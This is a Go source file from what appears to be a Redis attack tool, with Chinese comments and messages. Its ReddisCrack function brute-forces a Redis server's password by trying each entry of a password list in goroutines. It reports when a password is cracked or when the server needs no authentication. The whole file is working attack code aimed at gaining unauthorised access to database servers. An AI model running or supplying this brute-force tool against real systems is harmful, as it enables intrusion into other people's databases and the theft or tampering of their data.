package pac

import (
	"context"
	"fmt"
	"github.com/go-redis/redis/v8"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	Rdb             *redis.Client
	redisDir        string
	redisDbFilename string
)

// RedisClient 连接 Redis
func RedisClient(pwd string) (err error) {

	Rdb = redis.NewClient(&redis.Options{
		Addr:     fmt.Sprintf("%s:%s", Rhost, Rport),
		Password: pwd, // 密码认证
	})

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)

	defer cancel()

	pong, err := Rdb.Ping(ctx).Result()
	if err != nil {
		return err
	}
	if strings.Contains(pong, "PONG") {
		redisVersion()
	}
	return nil
}

var wg sync.WaitGroup

// 爆破密码
func ReddisCrack() {
	ch := make(chan struct{}, 1)
	for _, value := range Passwords {
		wg.Add(1)
		ch <- struct{}{}
		go func() {
			defer wg.Done()
			err := RedisClient(value)
			if err == nil {
				Success("成功爆破到 Redis 密码：" + value)
				os.Exit(0)
			} else if strings.Contains(err.Error(), "ERR Client sent AUTH, but no password is set") {
				Success("存在未授权 Redis , 不需要输入密码")
				os.Exit(0)
			} else {
				Err(err)
			}
			<-ch
		}()
	}
	wg.Wait()
	Info("未发现 Redis 密码")
}
